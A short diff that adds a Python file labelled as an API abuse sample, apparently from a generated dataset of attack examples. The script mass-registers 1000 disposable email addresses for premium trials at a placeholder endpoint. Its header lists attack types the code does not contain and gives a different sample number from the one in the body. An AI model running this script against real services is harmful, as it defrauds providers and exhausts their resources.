@@ -1,0 +1,14 @@
+# Resource Exhaustion - API Abuse Sample 13
+# Created: 2026-03-30T22:24:11.730375
+# Type: API Rate Limit Bypass / Enumeration / GraphQL Deep Query
+
+# API Subscription Abuse - Sample 7
+def subscription_abuse():
+    emails = [f"test{i}@tempmail.com" for i in range(1000)]
+    for email in emails:
+        requests.post(
+            "https://api.example.com/subscribe",
+            json={"email": email, "plan": "premium_trial"}
+        )
+        
+subscription_abuse()
